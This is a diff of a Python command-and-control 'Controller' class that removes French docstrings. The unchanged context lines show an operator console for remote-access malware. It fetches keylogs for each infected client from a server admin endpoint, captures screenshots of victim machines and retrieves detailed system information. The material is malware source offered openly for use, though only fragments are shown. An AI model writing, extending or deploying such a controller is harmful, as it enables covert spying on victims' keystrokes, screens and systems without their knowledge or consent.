@@ -591,7 +591,7 @@ class Controller:
 
     
     def view_keylogs(self, client_id):
-        """Afficher les keylogs récents (nécessite un endpoint serveur)"""
+        
         try:
             print(f"\n[+] Fetching recent keylogs for {client_id}...")
             response = requests.get(f"{self.server_url}/admin/keylogs/{client_id}", timeout=10)
@@ -647,7 +647,7 @@ class Controller:
                 print("[-] Invalid option")
     
     def handle_take_screenshot(self, client_id, multi=False):
-        """Prendre un screenshot"""
+        
         quality = input("Quality (30-95, default=65): ").strip()
         quality = int(quality) if quality.isdigit() else 65
         
@@ -676,7 +676,7 @@ class Controller:
     
     
     def save_screenshot_to_file(self, screenshot_data, client_id):
-        """Sauvegarder le screenshot dans un fichier"""
+        
         try:
             import base64
             from datetime import datetime
@@ -696,7 +696,7 @@ class Controller:
         
         
     def handle_detailed_system_info(self, client_id):
-        """Afficher les informations système détaillées"""
+        
         print("\n[+] Getting detailed system information...")
         
         # Menu pour choisir le type d'info
@@ -726,7 +726,7 @@ class Controller:
             print("[-] Invalid option")
 
     def display_detailed_system_info(self, system_data, info_type):
-        """Afficher les informations système de manière organisée"""
+        
         if not system_data or system_data.get("error"):
             error = system_data.get('error', 'Unknown error') if system_data else 'No response'
             print(f"[-] Failed to get system info: {error}")
